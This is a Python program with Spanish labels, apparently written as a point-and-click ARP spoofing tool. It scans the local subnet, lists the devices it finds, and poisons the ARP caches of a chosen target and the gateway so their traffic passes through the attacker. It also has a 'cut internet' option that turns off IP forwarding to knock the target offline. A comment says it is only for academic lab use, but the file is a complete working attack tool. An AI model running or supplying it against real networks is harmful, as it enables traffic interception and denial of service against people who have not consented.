#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Herramienta educativa para ARP Spoofing
Uso exclusivo en laboratorio controlado con fines académicos.
"""

import os
import platform
import time
import threading
import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp, sendp
from scapy.config import conf

stop_attack = False
hosts_data = []

# ----------------- Funciones de red -----------------
def log(msg):
    output_area.insert(tk.END, msg + "\n")
    output_area.see(tk.END)

def get_mac(ip, retries=3):
    for _ in range(retries):
        arp_req = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = srp(broadcast / arp_req, timeout=2, verbose=False)[0]
        if answered:
            return answered[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac, spoof_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=spoof_mac
    )
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    if dest_mac and src_mac:
        packet = ARP(op=2, pdst=destination_ip, hwdst=dest_mac,
                     psrc=source_ip, hwsrc=src_mac)
        send(packet, count=4, verbose=False)

def enable_ip_forwarding():
    system = platform.system().lower()
    if "linux" in system:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    elif "darwin" in system:
        os.system("sysctl -w net.inet.ip.forwarding=1")
    elif "windows" in system:
        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters "
                  "/v IPEnableRouter /t REG_DWORD /d 1 /f")

def disable_ip_forwarding():
    system = platform.system().lower()
    if "linux" in system:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    elif "darwin" in system:
        os.system("sysctl -w net.inet.ip.forwarding=0")
    elif "windows" in system:
        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters "
                  "/v IPEnableRouter /t REG_DWORD /d 0 /f")

def detectar_gateway():
    try:
        return conf.route.route("0.0.0.0")[2] # type: ignore
    except Exception:
        return ""

def escanear_red():
    global hosts_data
    gateway = detectar_gateway()
    if not gateway:
        return []
    subred = gateway.rsplit('.', 1)[0] + ".1/24"
    arp_req = ARP(pdst=subred)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = srp(broadcast / arp_req, timeout=2, verbose=False)[0]
    hosts_data = []
    for _, received in answered:
        if received.psrc != gateway:
            hosts_data.append((received.psrc, received.hwsrc))
    return hosts_data

# ----------------- Bucle de ataque -----------------
def attack_loop(target_ip, target_mac, gateway_ip, gateway_mac, cut_internet):
    global stop_attack
    stop_attack = False

    if not cut_internet:
        enable_ip_forwarding()
    else:
        disable_ip_forwarding()

    log(f"[+] Iniciando ARP spoofing contra {target_ip} ({target_mac})")

    while not stop_attack:
        spoof(target_ip, gateway_ip, target_mac, gateway_mac)
        spoof(gateway_ip, target_ip, gateway_mac, target_mac)
        time.sleep(2)

    log("[*] Ataque detenido. Restaurando red...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    if not cut_internet:
        disable_ip_forwarding()
    log("[+] Limpieza completada.")

# ----------------- Funciones GUI -----------------
def start_attack():
    selection = hosts_listbox.curselection()
    if not selection:
        messagebox.showerror("Error", "Debes seleccionar un dispositivo.")
        return
    index = selection[0]
    target_ip, target_mac = hosts_data[index]
    gateway_ip = detectar_gateway()
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        messagebox.showerror("Error", "No se pudo obtener la MAC del gateway.")
        return

    t = threading.Thread(target=attack_loop,
                         args=(target_ip, target_mac, gateway_ip, gateway_mac, var_cut_internet.get()),
                         daemon=True)
    t.start()

def stop_attack_fn():
    global stop_attack
    stop_attack = True

def cargar_hosts():
    hosts = escanear_red()
    hosts_listbox.delete(0, tk.END)
    for ip, mac in hosts:
        hosts_listbox.insert(tk.END, f"{ip}  |  {mac}")
    if not hosts:
        messagebox.showerror("Error", "No se encontraron dispositivos en la red.")

# ----------------- Interfaz -----------------
root = tk.Tk()
root.title("Herramienta Educativa ARP Spoofing")

# Frame principal dividido en 2 paneles
left_frame = tk.Frame(root)
left_frame.pack(side="left", fill="both", expand=True)

right_frame = tk.Frame(root)
right_frame.pack(side="right", fill="y")

# Consola de salida
output_area = scrolledtext.ScrolledText(left_frame, width=60, height=25)
output_area.pack(fill="both", expand=True, padx=5, pady=5)

# Lista de hosts
hosts_listbox = tk.Listbox(right_frame, width=40)
hosts_listbox.pack(padx=5, pady=5, fill="y")

# Botones y opciones
btn_scan = tk.Button(right_frame, text="Escanear Red", command=cargar_hosts, bg="blue", fg="white")
btn_scan.pack(pady=5, padx=5, fill="x")

var_cut_internet = tk.BooleanVar()
chk_cut = tk.Checkbutton(right_frame, text="Cortar Internet", variable=var_cut_internet)
chk_cut.pack(pady=5)

btn_start = tk.Button(right_frame, text="Iniciar Ataque", command=start_attack, bg="green", fg="white")
btn_start.pack(pady=5, padx=5, fill="x")

btn_stop = tk.Button(right_frame, text="Detener Ataque", command=stop_attack_fn, bg="red", fg="white")
btn_stop.pack(pady=5, padx=5, fill="x")

# Centrar ventana
root.update_idletasks()
width = root.winfo_width()
height = root.winfo_height()
x = (root.winfo_screenwidth() // 2) - (width // 2)
y = (root.winfo_screenheight() // 2) - (height // 2)
root.geometry(f"+{x}+{y}")

root.mainloop()
